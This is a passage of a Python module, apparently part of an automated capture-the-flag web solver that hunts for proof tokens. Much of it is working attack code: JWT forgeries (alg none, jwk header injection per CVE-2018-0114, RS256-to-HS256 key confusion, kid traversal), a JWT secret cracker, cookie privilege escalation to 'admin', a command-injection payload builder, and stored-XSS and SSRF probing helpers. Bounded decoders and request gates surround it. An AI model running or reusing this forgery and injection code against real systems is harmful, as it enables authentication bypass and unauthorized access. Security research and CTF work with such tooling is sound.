    return isinstance(v, str) and _CLUE_PARAM_NAME.fullmatch(v.strip()) is not None


def parse_clue_hints(doc):
    """A clue document (whatever JSON object `/api/clues` or a same-shaped endpoint returns) read into what the
    prober can act on, generalized from Day-16's `input_parameter`/`example_path` and never that day's ids:

      params     explicit parameter name(s) the feed STATES outright (CLUE_INPUT_PARAM_KEYS, then any list
                 under CLUE_INPUT_PARAMS_KEYS), in the order given, each a bare identifier -- never derived
                 from a route or an error word, so these rank ahead of clue_params' guesses.
      routes     every `*_route` string field, by its own key (`feature_route`, `secondary_route`, ...).
      examples   every `example_*` string field, kept for diagnostics only -- never turned into a new request.
      role       the first of CLUE_ROLE_KEYS that is a string, else None (diagnostics only).
      framework  the first of CLUE_FRAMEWORK_KEYS that is a string, else None (diagnostics only).

    {} fields for anything that is not a JSON object. Nothing here fabricates a payload or a technique: it only
    reads names the target already published about itself."""
    empty = {"params": [], "routes": {}, "examples": {}, "role": None, "framework": None}
    if not isinstance(doc, dict):
        return empty
    params = []
    for k in CLUE_INPUT_PARAM_KEYS:
        v = doc.get(k)
        if _is_clue_param_name(v) and v.strip() not in params:
            params.append(v.strip())
    for k in CLUE_INPUT_PARAMS_KEYS:
        v = doc.get(k)
        if isinstance(v, (list, tuple)):
            for item in v:
                if _is_clue_param_name(item) and item.strip() not in params:
                    params.append(item.strip())
    routes = {k: v for k, v in doc.items()
              if isinstance(v, str) and k.endswith("_route") and v.startswith("/")
              and not v.startswith("//") and " " not in v}
    examples = {k: v for k, v in doc.items() if isinstance(v, str) and k.startswith("example_")}
    role = next((doc[k] for k in CLUE_ROLE_KEYS if isinstance(doc.get(k), str)), None)
    framework = next((doc[k] for k in CLUE_FRAMEWORK_KEYS if isinstance(doc.get(k), str)), None)
    return {"params": params[:CLUE_PARAM_TRIES], "routes": routes, "examples": examples,
            "role": role, "framework": framework}


def _legacy_internal_ip(h):
    """Compatibility delegate for older proof-hunt tests and extensions."""
    return _web.legacy_ipv4(h)


def internal_host(host):
    """Compatibility delegate to the toolkit's shared no-DNS classifier."""
    return _web.internal_host(host)


def inner_ok(url):
    """Compatibility delegate retaining proof_hunt's destructive-term policy."""
    return _web.safe_internal_url(url, destructive=is_destructive) is not None


def _looks_like_url_value(value):
    """True when an observed parameter value is an absolute/protocol-relative URL.

    An offered URL is a strong SSRF contract.  Do not spend the earlier generic
    LFI/SQLi/SSTI/cmdi/NoSQL probes mutating that same parameter before the
    bounded SSRF reader has established its plain control.  Decode a few layers
    because links in HTML and specifications commonly carry an encoded URL.
    """
    decoded = str(value or "").strip()
    for _ in range(4):
        folded = decoded.lower()
        if folded.startswith("//") or re.match(
                r"^(?:https?|file|gopher|dict|ftp|ldap|ws|wss):", folded):
            return True
        nxt = urllib.parse.unquote_plus(decoded)
        if nxt == decoded:
            break
        decoded = nxt.strip()
    return False


def cookie_raises(value):
    """[raised value]: a non-JWT cookie whose value is a low-privilege role word -> 'admin' (its case kept); one
    whose base64 (or plain text) is a JSON object -> jwt_raise() of it, encoded back the same way. Else []."""
    out = []
    try:
        raw = str(value or "")
        if not raw or (raw.startswith("eyJ") and raw.count(".") == 2):
            return out
        v = urllib.parse.unquote(raw)
        enc = (lambda s: urllib.parse.quote(s, safe="")) if v != raw else (lambda s: s)
        word = v.strip().strip('"')
        if word.lower() in ROLE_WORDS:
            new = "ADMIN" if word.isupper() else "Admin" if word[:1].isupper() else "admin"
            out.append(enc(v.replace(word, new)))
            return out

        def dump(d, src):
            return json.dumps(d) if (", " in src or ": " in src) else json.dumps(d, separators=(",", ":"))
        if v.lstrip().startswith("{"):
            d = _security_json.loads(v, max_chars=16_384)
            if isinstance(d, dict):
                out.append(enc(dump(jwt_raise(d), v)))
            return out
        if len(v) < 8 or not re.fullmatch(r"[A-Za-z0-9+/_\-]+={0,2}", v):
            return out
        url = "-" in v or "_" in v
        dec = (base64.urlsafe_b64decode if url else base64.b64decode)(v + "=" * (-len(v) % 4))
        txt = dec.decode("utf-8")
        if not txt.lstrip().startswith("{"):
            return out
        d = _security_json.loads(txt, max_chars=16_384)
        if isinstance(d, dict):
            b = (base64.urlsafe_b64encode if url else base64.b64encode)(dump(jwt_raise(d), txt).encode()).decode()
            out.append(enc(b if v.endswith("=") else b.rstrip("=")))
    except Exception:
        return out
    return out


def is_destructive(text):
    """True when a path, a parameter name or an offered link's query names a state-changing action."""
    try:
        layers = _web.canonical_route_layers(str(text or ""), plus=True, max_bytes=4096)
        if not layers:
            return True
        for layer in layers:
            folded = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", layer)
            if (_DESTRUCTIVE.search(folded)
                    or _web.route_has_destructive_action(layer)):
                return True
        return False
    except Exception:
        return True


def _xss_path(value, *, template=False):
    """A query-free path safe to embed as data in the stored-XSS payload.

    A receipt template must contain exactly one literal ``{id}``; no other
    braces are accepted.  Repeated URL decoding closes encoded quote,
    backslash, control-character and authority-confusion spellings.  The
    returned value is still JSON-quoted before it enters JavaScript.
    """
    if not isinstance(value, str):
        return None
    raw = value.strip()
    if (raw != value or not raw or len(raw.encode("utf-8", "replace")) > 1024 or raw.startswith("//")
            or "?" in raw or "#" in raw or "\\" in raw):
        return None
    if template:
        if raw.count("{id}") != 1 or raw.replace("{id}", "").find("{") >= 0 \
                or raw.replace("{id}", "").find("}") >= 0:
            return None
        check = raw.replace("{id}", "HUNTRESSID")
    else:
        if "{" in raw or "}" in raw:
            return None
        check = raw
    if not _XSS_PATH.fullmatch(check):
        return None
    if not _web.safe_route_path(check, max_bytes=1024):
        return None
    for decoded in _web.canonical_route_layers(check, max_bytes=1024) or ():
        if (any(c in decoded for c in ("'", '"', "<", ">"))
                or _web.route_has_destructive_action(decoded)):
            return None
    return raw


def _stateful_path(value):
    """A query-free path safe for the bounded CSRF/upload state transition.

    The target may choose the opaque suffix and benign action word, including
    the historical ``inspect``, ``execute``, ``upload``, ``submit`` and
    ``dispatch`` variants.  It may not smuggle a second URL/query, traversal,
    authority, or an unrelated destructive action.  Repeated URL and HTML
    decoding is used only for validation; the original path is returned.
    """
    if not isinstance(value, str):
        return None
    raw = value.strip()
    if (raw != value or not raw or len(raw.encode("utf-8", "replace")) > 1024
            or not raw.startswith("/") or raw.startswith("//")
            or any(c in raw for c in ("?", "#", "\\"))):
        return None
    if not _XSS_PATH.fullmatch(raw):
        return None
    if not _web.safe_route_path(raw, max_bytes=1024):
        return None
    for decoded in _web.canonical_route_layers(raw, max_bytes=1024) or ():
        folded = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", decoded)
        if (_STATEFUL_FATAL_PATH.search(folded)
                or _web.route_has_destructive_action(decoded)):
            return None
    return raw


def is_proof(value):
    """High-confidence auto-submit wire form; UUID-v4 is an observed validator, not the contract."""
    return isinstance(value, str) and bool(PROOF_WIRE.fullmatch(value))


def _strip_offhost_urls(text, host):
    """Remove absolute/protocol-relative URLs to another host from untrusted text."""
    text = str(text or "")
    if not host:
        return text
    wanted = str(host).lower().rstrip(".")

    def canonical_layers(raw):
        current = str(raw or "")[:DECODE_BODY_CAP]
        layers = []
        stable = False
        for _ in range(13):
            normalized = _html.unescape(current)
            normalized = re.sub(r"\\+(?:/|u002f|x2f)", "/", normalized, flags=re.I)
            normalized = re.sub(r"\\+(?:u003a|x3a)", ":", normalized, flags=re.I)
            normalized = re.sub(r"(?i)([a-z][a-z0-9+.-]{0,31}:)\\+", r"\1//", normalized)
            normalized = re.sub(r"(?<![A-Za-z0-9])\\{2,}", "//", normalized)
            if (re.search(r"(?i)(?:https?|ftp|wss?|file):[\\/]", normalized)
                    or re.search(r"(?<![A-Za-z0-9])//", normalized)
                    or normalized.lstrip().startswith("\\\\")):
                normalized = normalized.replace("\\", "/")
            normalized = re.sub(r"(?i)((?:https?|ftp|wss?|file):)/+", r"\1//", normalized)
            normalized = normalized[:DECODE_BODY_CAP]
            if not layers or normalized != layers[-1]:
                layers.append(normalized)
            nxt = urllib.parse.unquote_plus(normalized)[:DECODE_BODY_CAP]
            if nxt == normalized:
                stable = True
                break
            current = nxt
        return layers, stable

    def url_host(raw):
        try:
            raw = str(raw or "")
            if raw.startswith("//"):
                raw = "http:" + raw
            found = (urllib.parse.urlsplit(raw).hostname or "").lower().rstrip(".")
            if not found and re.match(r"(?i)^(?:(?:https?|ftp|wss?|file):/+|//+)", raw):
                return "!ambiguous-authority"
            return found
        except ValueError:
            return ""

    def strip(match):
        found = url_host(match.group(0))
        return match.group(0) if not found or found == wanted else " "

    cleaned = _ABS_URL.sub(strip, text)

    def strip_encoded(match):
        raw = match.group(0)
        layers, stable = canonical_layers(raw)
        hosts = [url_host(value) for value in layers]
        if not stable:
            return " "
        return raw if not any(found and found != wanted for found in hosts) else " "

    cleaned = _ENCODED_ABS_URL.sub(strip_encoded, cleaned)
    offhost_proofs = set()
    whole_offhost = False
    layers, stable = canonical_layers(text)
    for decoded in layers:
        whole = _ABS_URL.fullmatch(decoded.strip())
        if whole is not None and url_host(whole.group(0)) not in ("", wanted):
            whole_offhost = True
        for match in _ABS_URL.finditer(decoded):
            if url_host(match.group(0)) not in ("", wanted):
                offhost_proofs.update(PROOF_SEEN.findall(match.group(0)))
    if not stable or whole_offhost:
        return ""
    for proof in sorted(offhost_proofs, key=len, reverse=True):
        cleaned = re.sub(re.escape(proof), "", cleaned, flags=re.I)
    return cleaned


def scan_for_proofs(text, host):
    """Every proof-like value in a text, with each absolute URL to ANOTHER host removed first."""
    return set(PROOF_SEEN.findall(_strip_offhost_urls(text, host)))


def scan_for_baseline_proofs(text, host):
    """Proof tokens a non-payoff/control response must subtract.

    Payoff scanning excludes off-host carriers.  Controls are allowed to be
    more conservative: union raw wire tokens with that filtered result so an
    ambiguous deep carrier elsewhere in one body cannot blank a separate
    decoy and make its later echo look novel.  Raw tokens never enter a payoff.
    """
    raw = str(text or "")
    return scan_for_proofs(raw, host) | set(PROOF_SEEN.findall(raw))


# ---------------------------------------------------------------------------------------------------------
#  A3 (backlog ticket): recover a proof returned LAYER-ENCODED, OFFLINE, from bytes ALREADY fetched.
#  Flips a Day-23-style web class (the proof comes back wrapped in base64/hex/gzip/... or in a header, a
#  cookie or a JSON field) from an agent hand-solve to a Layer-1 seconds close. This decoder sends no request:
#  path sends NOTHING; it only post-processes bytes the waves already pulled. It is depth- and size-bounded,
#  a value is banked only when it decodes to EXACTLY the judged proof form and is the sole novel payoff after
#  baseline subtraction. flag stays None otherwise.
# ---------------------------------------------------------------------------------------------------------
DECODE_MAX_DEPTH = 4            # short stacks of encodings only
DECODE_MAX_OUTPUT = 8192        # a proof is 38 bytes; a wrapper around it is small
DECODE_MAX_NODES = 40           # decode-tree nodes explored per starting token
DECODE_MAX_TOKENS = 300         # candidate tokens pulled from one hunt's pages
DECODE_MIN_TOKEN = 16           # shorter than this cannot wrap an encoded proof
DECODE_MAX_TOKEN = 8192         # longer than this is no around-a-proof wrapper
DECODE_BODY_CAP = 300_000       # bytes of one text scanned for encoded runs

_B64_RUN = re.compile(r"[A-Za-z0-9+/_\-]{16,}={0,2}")
_B32_RUN = re.compile(r"[A-Z2-7]{16,}={0,8}")
_HEX_RUN = re.compile(r"(?i)(?:0x)?[0-9a-f]{16,}")
_DATA_URI = re.compile(r"(?i)\bdata:[^;,\s]*(?:;[^,\s]*)*,([A-Za-z0-9+/%_\-=]{16,})")
_PRE_CODE = re.compile(r"(?is)<(?:pre|code)\b[^>]*>(.*?)</(?:pre|code)>")
_WS = re.compile(r"\s+")
_B64_TRANS = str.maketrans("-_", "+/")
_B64_OK = re.compile(r"[A-Za-z0-9+/]+={0,2}")
_B32_OK = re.compile(r"[A-Z2-7]+={0,8}")
_HEX_OK = re.compile(r"(?i)[0-9a-f]+")


def _d_b64(text):
    """base64 or base64url (the alphabets are folded together), padding fixed. None on anything else."""
    t = _WS.sub("", text).translate(_B64_TRANS)
    if len(t) < DECODE_MIN_TOKEN or not _B64_OK.fullmatch(t):
        return None
    core = t.rstrip("=")
    if len(core) % 4 == 1:            # an impossible base64 length
        return None
    try:
        raw = base64.b64decode(core + "=" * (-len(core) % 4))
    except Exception:
        return None
    return bytes(raw) if raw else None


def _d_b32(text):
    t = _WS.sub("", text).upper()
    if len(t) < DECODE_MIN_TOKEN or not _B32_OK.fullmatch(t):
        return None
    core = t.rstrip("=")
    try:
        raw = base64.b32decode(core + "=" * (-len(core) % 8))
    except Exception:
        return None
    return bytes(raw) if raw else None


def _d_hex(text):
    t = _WS.sub("", text)
    if t[:2].lower() == "0x":
        t = t[2:]
    if len(t) < DECODE_MIN_TOKEN or len(t) % 2 or not _HEX_OK.fullmatch(t):
        return None
    try:
        return bytes.fromhex(t)
    except Exception:
        return None


def _d_url(data):
    s = bytes(data).decode("latin-1", "ignore")
    if "%" not in s:
        return None
    try:
        raw = urllib.parse.unquote_to_bytes(s)
    except Exception:
        return None
    return raw if raw and raw != bytes(data) else None


def _inflate_bounded(data, wbits):
    """Inflate with the output limit applied during decompression.

    Slicing the result of ``gzip.decompress``/``zlib.decompress`` is not a
    resource bound: those functions allocate the complete expanded stream
    first. Reject overflow instead of materializing a target-controlled bomb.
    """
    try:
        dec = zlib.decompressobj(wbits)
        raw = dec.decompress(bytes(data), DECODE_MAX_OUTPUT + 1)
        if (len(raw) > DECODE_MAX_OUTPUT or dec.unconsumed_tail or dec.unused_data
                or not dec.eof):
            return None
        # Detect output buffered behind a stream exactly at the limit.
        if dec.decompress(b"", 1):
            return None
        return bytes(raw) if raw else None
    except Exception:
        return None


def _d_gzip(data):
    b = bytes(data)
    if len(b) < 3 or b[0] != 0x1F or b[1] != 0x8B:
        return None
    return _inflate_bounded(b, 31)


def _d_zlib(data):
    """zlib, raw DEFLATE and gzip-via-zlib (several wbits)."""
    b = bytes(data)
    out = []
    if len(b) < 2:
        return out
    for wbits in (15, -15, 31):
        raw = _inflate_bounded(b, wbits)
        if raw:
            out.append(raw)
    return out


def _decode_layer(data):
    """Every single-layer decode of `data` (bytes) that yields something new and bounded."""
    b = bytes(data if isinstance(data, (bytes, bytearray)) else str(data).encode("latin-1", "ignore"))
    text = b.decode("latin-1", "ignore")
    out = []
    for r in (_d_b64(text), _d_b32(text), _d_hex(text), _d_url(b), _d_gzip(b)):
        if r:
            out.append(bytes(r))
    out += _d_zlib(b)
    uniq = []
    for r in out:
        if 0 < len(r) <= DECODE_MAX_OUTPUT and r != b and r not in uniq:
            uniq.append(r)
    return uniq


def _decode_tree(token):
    """Yield every decoded leaf (bytes) reachable from `token` within the depth/size/node budget. A short
    stack of encodings only (depth <= DECODE_MAX_DEPTH), size-capped, so it always terminates."""
    try:
        start = token.encode("latin-1", "ignore") if isinstance(token, str) else bytes(token)
    except Exception:
        return
    seen = {start}
    stack = [(start, 0)]
    nodes = 0
    while stack and nodes < DECODE_MAX_NODES:
        data, depth = stack.pop()
        if depth >= DECODE_MAX_DEPTH:
            continue
        for nxt in _decode_layer(data):
            if nxt in seen:
                continue
            nodes += 1
            seen.add(nxt)
            yield nxt
            stack.append((nxt, depth + 1))
            if nodes >= DECODE_MAX_NODES:
                break


def _cookie_values(raw):
    """Each cookie VALUE in a Set-Cookie header (the part after the first '=', before ';')."""
    out = []
    for part in re.split(r"[\r\n]+", str(raw or "")):
        head = part.split(";", 1)[0]
        if "=" in head:
            out.append(head.split("=", 1)[1].strip().strip('"'))
    return out


def _with_query(path, name, value):
    base, _, q = path.partition("?")
    pairs = [(k, v) for k, v in urllib.parse.parse_qsl(q, keep_blank_values=True) if k != name]
    pairs.append((name, value))
    return base + "?" + urllib.parse.urlencode(pairs)


def _attrs(text):
    out = {}
    for m in _ATTR.finditer(text or ""):
        out[m.group(1).lower()] = next((g for g in m.groups()[1:] if g is not None), "")
    return out


def _is_asset(path):
    low = path.split("?", 1)[0].lower()
    return low.endswith(ASSET_EXT) or "/assets/" in low or "/static/" in low


def _b64e(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _b64d(seg):
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def jwt_sign(header, payload, key):
    """A compact JWT: alg none (key None, empty signature) or HMAC under header['alg']."""
    h = _b64e(json.dumps(header, separators=(",", ":")).encode())
    p = _b64e(json.dumps(payload, separators=(",", ":")).encode())
    if key is None:
        return f"{h}.{p}."
    fn = JWT_HASH.get(str(header.get("alg", "")).upper(), hashlib.sha256)
    return f"{h}.{p}." + _b64e(hmac.new(key, f"{h}.{p}".encode(), fn).digest())


def jwt_crack(token):
    """The token's HMAC secret when it is one of JWT_SECRETS (offline: no request), else None."""
    try:
        h, p, sig = token.split(".")
        header = _security_json.loads(_b64d(h).decode("utf-8", "strict"), max_chars=16_384)
        payload = _security_json.loads(_b64d(p).decode("utf-8", "strict"), max_chars=131_072)
        if not isinstance(header, dict) or not isinstance(payload, dict):
            return None
        alg = str(header.get("alg", "")).upper()
        fn = JWT_HASH.get(alg)
        if fn is None or not sig:
            return None
        want = _b64d(sig)
        for s in JWT_SECRETS:
            if hmac.compare_digest(hmac.new(s.encode(), f"{h}.{p}".encode(), fn).digest(), want):
                return s
    except Exception:
        return None
    return None


def jwt_raise(payload, identity=False):
    """The claims raised to admin: role-like claims to 'admin', admin flags to true (both added when the token
    has none), an expired exp moved an hour ahead; with identity=True the user-name claims too."""
    out = dict(payload)
    hit = False
    for k, v in payload.items():
        kl = str(k).lower()
        if kl in _ROLE_KEYS:
            out[k] = (["admin"] + [x for x in v if x != "admin"]) if isinstance(v, list) else "admin"
            hit = True
        elif kl in _FLAG_KEYS:
            out[k] = 1 if isinstance(v, (int, float)) and not isinstance(v, bool) else True
            hit = True
        elif identity and kl in _IDENT_KEYS and isinstance(v, str):
            out[k] = "admin"
    if not hit:
        out.setdefault("role", "admin")
        out.setdefault("admin", True)
    try:
        if "exp" in out and float(out["exp"]) < time.time() + 60:
            out["exp"] = int(time.time()) + 3600
    except (TypeError, ValueError):
        pass
    return out


_ATTACKER_RSA_KEY = None   # one ephemeral attacker RSA key per process (the jwk-injection forgery below)


def _attacker_rsa_key():
    """A process-wide ephemeral RSA private key for the jwk self-signed forgery, or None when `cryptography`
    is absent. Generated once and reused, so every jwk forgery of one hunt embeds the same attacker key."""
    global _ATTACKER_RSA_KEY
    if _ATTACKER_RSA_KEY is None:
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa
            _ATTACKER_RSA_KEY = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        except Exception:
            _ATTACKER_RSA_KEY = False
    return _ATTACKER_RSA_KEY or None


def jwt_jwk_forge(payload, kid=None):
    """CVE-2018-0114 (jwk header self-signed injection): a JWT whose header embeds an ATTACKER-generated RSA
    public key in the `jwk` parameter and is RS256-signed with the matching PRIVATE key. A server that trusts
    the embedded `jwk` to verify the token accepts it. Returns the compact token, or None when `cryptography`
    is absent. Read-only: GET-replayed like every other forgery; the attacker key is never a judged answer."""
    key = _attacker_rsa_key()
    if key is None:
        return None
    try:
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import padding
        nums = key.public_key().public_numbers()

        def _b64u_uint(n):
            return _b64e(n.to_bytes((n.bit_length() + 7) // 8 or 1, "big"))
        jwk = {"kty": "RSA", "n": _b64u_uint(nums.n), "e": _b64u_uint(nums.e)}
        if kid:
            jwk["kid"] = str(kid)
        header = {"alg": "RS256", "typ": "JWT", "jwk": jwk}
        h = _b64e(json.dumps(header, separators=(",", ":")).encode())
        p = _b64e(json.dumps(payload, separators=(",", ":")).encode())
        sig = key.sign(f"{h}.{p}".encode(), padding.PKCS1v15(), hashes.SHA256())
        return f"{h}.{p}.{_b64e(sig)}"
    except Exception:
        return None


def jwk_to_pem(jwk):
    """An RSA JWK ({kty:RSA, n, e}) as a SubjectPublicKeyInfo PEM string, or None (not RSA, bad fields, or
    `cryptography` absent). Used only to feed forge_jwt_hs_confusion; never a judged answer."""
    try:
        if not isinstance(jwk, dict) or str(jwk.get("kty")).upper() != "RSA" or "n" not in jwk or "e" not in jwk:
            return None
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        n = int.from_bytes(_b64d(str(jwk["n"])), "big")
        e = int.from_bytes(_b64d(str(jwk["e"])), "big")
        pub = rsa.RSAPublicNumbers(e, n).public_key()
        return pub.public_bytes(serialization.Encoding.PEM,
                                serialization.PublicFormat.SubjectPublicKeyInfo).decode()
    except Exception:
        return None


def jwt_forgeries(token, decoded, public_keys=()):
    """[(tag, forged token)]: alg none (raised claims, then identity too); the cracked secret's HMAC; kid
    traversal with an empty key only when the header carries a kid; and, when the token is asymmetric (RS*/ES*/
    PS*) and exactly one public key is readable, RS256->HS256 algorithm confusion signed with the public-key
    bytes (web.forge_jwt_hs_confusion). A token that names a hosted ``jku``/``x5u`` is left entirely to the
    gated agent path: even replaying another forgery could make a permissive verifier fetch that URL. Never
    more than 8."""
    header, payload = dict(decoded.get("header") or {}), dict(decoded.get("payload") or {})
    if header.get("jku") or header.get("x5u"):
        return []
    variants = [("a", jwt_raise(payload)), ("b", jwt_raise(payload, identity=True))]
    if variants[0][1] == variants[1][1]:
        variants = variants[:1]
    out = [(f"none-{vt}", jwt_sign({"alg": "none", "typ": "JWT"}, claims, None)) for vt, claims in variants]
    # jwk header self-signed injection (CVE-2018-0114): the header carries an attacker RSA public key and the
    # token is RS256-signed with the matching private key; a server that trusts the embedded jwk accepts it.
    # Read-only GET replay like the others; dropped silently when `cryptography` is absent (+1 forgery row).
    for vt, claims in variants:
        jwk_tok = jwt_jwk_forge(claims, kid=header.get("kid"))
        if jwk_tok:
            out.append((f"jwk-{vt}", jwk_tok))
    secret = jwt_crack(token)
    if secret is not None:
        alg = str(header.get("alg", "HS256")).upper()
        hdr = {k: v for k, v in header.items() if k != "alg"}
        out += [(f"hs-{vt}", jwt_sign(dict(hdr, alg=alg), claims, secret.encode())) for vt, claims in variants]
    if "kid" in header:
        hdr = {k: v for k, v in header.items() if k not in ("alg", "kid")}
        out += [(f"kid-{vt}", jwt_sign(dict(hdr, alg="HS256", kid=JWT_KID), claims, b"")) for vt, claims in variants]
    # RS256/ES256 -> HS256 confusion: a server that verifies an HS256 token with its RSA PUBLIC key accepts a
    # token we sign with the public-key bytes as the HMAC secret. Only for an asymmetric token with a key in hand.
    # The exact key BYTES matter and vary by server (the PEM as a string, or the PEM file with a trailing
    # newline -- a /jwks capture usually lacks it), so try a few forms of each key with the role-raised claims.
    unique_public_keys = list(dict.fromkeys(public_keys))
    if (len(unique_public_keys) == 1
            and str(header.get("alg", "")).upper()[:2] in ("RS", "ES", "PS")):
        keyforms = []
        for pub in unique_public_keys:
            for kb in (pub, pub + "\n", pub.strip()):
                if kb and kb not in keyforms:
                    keyforms.append(kb)
        for ki, kb in enumerate(keyforms[:3]):
            try:
                out.append((f"hsconf{ki}", _web.forge_jwt_hs_confusion(variants[0][1], kb, alg="HS256")))
            except Exception:
                pass
    return out[:8]


def _cmdi_payloads(command, separators=None, contexts=None, prefix="", spaced=False):
    """[(separator, context, payload)]: solvers/toolkits/web_exploit.py's cmdi_payloads rule (a separator closes
    the quote and comments out the rest with ` #`; $( ) and backticks substitute inside it). `spaced` puts a
    space before a substitution (a read: the file's text then stands apart from the prefix, so a proof is not
    glued to `127.0.0.1` where the proof reader's word boundary would not see it)."""
    out = []
    for cname, q_open, q_close in (contexts or CMDI_CONTEXTS):
        for sname, tmpl in (separators or CMDI_SEPARATORS):
            if tmpl.startswith(("`", "$(")):
                p = prefix + q_open + (" " if spaced else "") + tmpl.format(c=command) + q_close
            else:
                p = prefix + q_open + tmpl.format(c=command) + (" #" if q_open else "")
            out.append((sname, cname, p))
    return out


class _Stop(Exception):
    pass


class _PeerClient:
    """Transparent WebClient guard for sibling solvers.

    Every wire-capable method participates in the owning Hunter's reservation/drain gate.
    Returned response dictionaries are retained in-memory so an unsuccessful peer's proof-like
    controls can be adopted as plain baseline instead of becoming novel in a later wave.
    """

    _LOCAL = frozenset(("_hunter", "_client", "_captured"))

    def __init__(self, hunter, client, captured):
        object.__setattr__(self, "_hunter", hunter)
        object.__setattr__(self, "_client", client)
        object.__setattr__(self, "_captured", captured)

    def __getattr__(self, name):
        return getattr(self._client, name)

    def __setattr__(self, name, value):
        if name in self._LOCAL:
            object.__setattr__(self, name, value)
        else:
            setattr(self._client, name, value)

    def _send(self, method, *args, **kwargs):
        hunter = self._hunter
        if not hunter._may_send() or not hunter._reserve_send():
            raise RuntimeError("peer send gate closed")
        try:
            if not hunter._reserved_send_still_allowed():
                raise RuntimeError("peer send gate closed")
            # Charge immediately before transport. A request can reach the
            # target and then raise before the peer publishes its summary;
            # deferred accounting made that stateful descriptor retryable.
            with hunter.lock:
                ceiling = hunter.request_ceiling if hunter.request_ceiling is not None else hunter.max_requests
                if hunter.requests >= min(hunter.max_requests, ceiling):
                    hunter.stopped = hunter.stopped or "max_requests"
                    raise RuntimeError("peer request budget exhausted")
                hunter.requests += 1
            # Accounting can block behind the Hunter's result lock.  A stop
            # or deadline may arrive after the earlier reservation check, so
            # close that second check/send window before entering transport.
            # The conservative request charge is intentional on refusal.
            if not hunter._reserved_send_still_allowed():
                raise RuntimeError("peer send gate closed")
            result = getattr(self._client, method)(*args, **kwargs)
            if isinstance(result, dict):
                with hunter.lock:
                    self._captured.append(dict(result))
            return result
        finally:
            hunter._release_send()

    def request(self, *args, **kwargs):
        return self._send("request", *args, **kwargs)

    def get(self, *args, **kwargs):
        return self._send("get", *args, **kwargs)

    def post(self, *args, **kwargs):
        return self._send("post", *args, **kwargs)

    def websocket_receive(self, *args, **kwargs):
        return self._send("websocket_receive", *args, **kwargs)

    def websocket_conversation(self, *args, **kwargs):
        return self._send("websocket_conversation", *args, **kwargs)

    def sse_first_event(self, *args, **kwargs):
        return self._send("sse_first_event", *args, **kwargs)

    def sse_events(self, *args, **kwargs):
        return self._send("sse_events", *args, **kwargs)


class _Hunter:
    """One target. Never raises out of run()."""

    def _client_kwargs(self):
        """Extra WebClient keywords. ``get_only`` is passed only when set, so the default path
        constructs ``WebClient(url, timeout=...)`` exactly as before B-007 (callers and tests that
        substitute their own client factory keep working)."""
        return {"get_only": True} if self.get_only else {}

    def __init__(self, url, *, deadline=None, max_requests=400, stop=None, files=(), refused_files=(),
                 prompt="", get_only=False):
        self.url = url
        self.deadline = deadline
        # When set, every WebClient this hunter (and its siblings) build refuses any non-GET method at
        # the wire, so the clue-gated state-changing siblings cannot mutate the target (B-007/Open O-2).
        self.get_only = bool(get_only)
        try:
            # An explicit zero is a hard no-wire contract used by callers to
            # hand us an exhausted shared budget.  Only an omitted/None value
            # receives the standalone default.
            self.max_requests = 400 if max_requests is None else max(0, int(max_requests))
        except (TypeError, ValueError):
            self.max_requests = 400
        self.stop = stop or threading.Event()
        self.lock = threading.Lock()
        # ``solve_targets`` may reach its absolute deadline while a wave worker
        # has reserved a request but has not entered WebClient.request yet.  A
        # stop Event alone does not close that gap: the paused worker can wake
        # after the caller returns and put the request on the wire.  Track every
        # reserved/in-flight direct send separately from the result-state lock,
        # so parallel GETs remain parallel while stop_now() can close the send
        # gate and wait for all reservations to retire.
        self._send_condition = threading.Condition()
        self._send_closed = False
        self._active_sends = 0
        self.requests = 0
        self.pages = {}             # path (as requested) -> page dict
        self.seen = {}              # proof -> [(path, shape)]
        self.payoff = {}            # proof -> (path, shape, group)
        self.plain = set()          # proofs a plain (non-exploit) page showed
        self.baseline_incomplete = False  # one control was truncated/ambiguous/unreadable
        self.hit_group = None
        self.refused = ["prompt-file:" + str(f)[:180] for f in (refused_files or ())]
        self.findings = []          # the Day-24 SAFE breadth (wave 9): read-only detector leads, never a proof
        self.recon_findings = []    # offline browser/session metadata; separate so it cannot evict class leads
        self.candidates = []        # successful-response tokens of a new shape: surface, never auto-return
        self.forge_meta = None      # forge_event's bounded request/success summary, when applicable
        self.forge_target = None    # filled by solve_targets; direct _Hunter tests remain GET-compatible
        self.forge_ctx = {}
        self.peer_meta = {}         # bounded D11-D13/D17/D18 sibling summaries
        self.router_dispatch_plan = []  # recon_router's evidence-ranked phase ownership rows
        self.endpoint_inventory = None  # passive OpenAPI/sitemap/JS/source-map inventory summary
        self.prefetched_descriptors = set()  # row 559: descriptor GETs sent as one wave before inventory
        self._router_read_actions = {}  # exact clue discovery GET -> one permitted read-action token
        self._router_discovery_routes = {}  # unique landing-linked router discovery controls
        self.request_ceiling = None     # temporary shared cap for one bounded recon phase
        self.offline_analysis = {
            "browser": {"items": 0, "bytes": 0},
            "session": {"items": 0, "bytes": 0},
        }
        self.decoded = None         # A3: a proof recovered layer-decoded from bytes already fetched (no request)
        self.stopped = None
        self.shape = None
        self.t0 = time.time()
        # the paths the start's own text names first, then DEFAULT_FILES (round 2, row 393)
        # (LATE_FILES, unless the prompt names one, wait for wave 6b: the Day 21 final prep)
        prompt_files = list(dict.fromkeys(files or ()))
        self.prompt_files = prompt_files[:MAX_FILES]
        self.files = list(dict.fromkeys(prompt_files + [f for f in DEFAULT_FILES if f not in LATE_FILES]))[:MAX_FILES]
        self.late_files = [f for f in DEFAULT_FILES if f in LATE_FILES
                           and f not in self.files][:max(0, MAX_FILES - len(self.files))]
        self.prompt_text = str(prompt or "")[:20_000]
        self.post_prompt = self.prompt_text  # solve_targets narrows this for multi-target attempts
        self.routes, bad_routes = prompt_routes(self.prompt_text)
        self.refused += ["prompt-route:" + r[:180] for r in bad_routes]
        self.where = None
        self.app_root = "/"
        self.app_prefix = "/"
        self.robots_route = "/robots.txt"
        self.clues_route = "/api/clues"
        self.openapi_route = "/openapi.json"
        try:
            self.host = (urllib.parse.urlsplit(url).hostname or "").lower()
            self.client = _web.WebClient(url, timeout=REQUEST_TIMEOUT, **self._client_kwargs())
            app_path = urllib.parse.urlsplit(self.client.application_base).path or "/"
